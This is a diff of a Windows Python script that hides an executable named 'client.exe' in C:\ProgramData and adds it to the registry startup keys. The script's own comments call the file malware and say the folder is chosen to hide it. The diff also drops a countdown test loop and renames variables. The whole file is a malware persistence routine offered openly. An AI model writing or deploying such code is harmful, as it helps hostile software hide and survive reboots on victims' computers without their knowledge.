@@ -1,6 +1,5 @@
 import winreg as reg
 import os
-import time
 import shutil
 
 
@@ -28,30 +27,23 @@ def add_to_startup(executable_path):
 
 def find_path():
     # Name of your executable
-    executable_name = 'test.exe'
+    executable_name = 'client.exe'
     # name of directory you want to move .exe to, be hidden
     target_directory = r'C:\ProgramData'
     # get current directory
     current_directory = os.getcwd()
     # Full path to the executable
-    source_path = os.path.join(current_directory, executable_name)
+    source_path_executable = os.path.join(current_directory, executable_name)
+    source_path_log = os.path.join(current_directory)
     # moves the malware.exe to another hidden folder
-    shutil.move(source_path, target_directory)
+    shutil.move(source_path_executable, target_directory)
     # joins the name of new directory and .exe file name
     executable_path = os.path.join(target_directory, executable_name)
     # adds the file to start up register
     add_to_startup(executable_path)
     # for testing
-    print(source_path)
+    print(source_path_executable)
     print(executable_path)
 
 
 find_path()
-# Count down from 10 to 1
-for i in range(10, 0, -1):
-    print(i)
-    time.sleep(1)
-
-print("Done!")
-
-
